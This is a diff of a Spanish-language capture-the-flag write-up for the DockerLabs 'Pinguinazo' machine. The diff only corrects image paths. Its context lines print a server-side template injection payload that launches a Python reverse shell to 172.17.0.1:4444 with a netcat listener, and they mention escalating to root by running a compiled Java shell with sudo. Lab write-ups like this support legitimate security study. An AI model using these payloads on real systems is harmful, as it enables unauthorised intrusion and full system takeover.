@@ -69,11 +69,11 @@ Con `nc -lvnp 4444` escuchando en nuestra máquina, inyectamos el siguiente payl
 {{request.application.__globals__.__builtins__.__import__('os').popen('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'').read()}}
 ```
 
-![Foto1](DockerLabs/Pinguinazo/assets/1.png)
+![Foto1](assets/1.png)
 
 Obtenemos shell como usuario **pinguinazo**:
 
-![Foto2](DockerLabs/Pinguinazo/assets/2.png)
+![Foto2](assets/2.png)
 
 ---
 
@@ -110,7 +110,7 @@ javac Shell.java
 sudo java Shell
 ```
 
-![Foto2](DockerLabs/Pinguinazo/assets/3.png)
+![Foto2](assets/3.png)
 
 Shell como **root** obtenida.
 
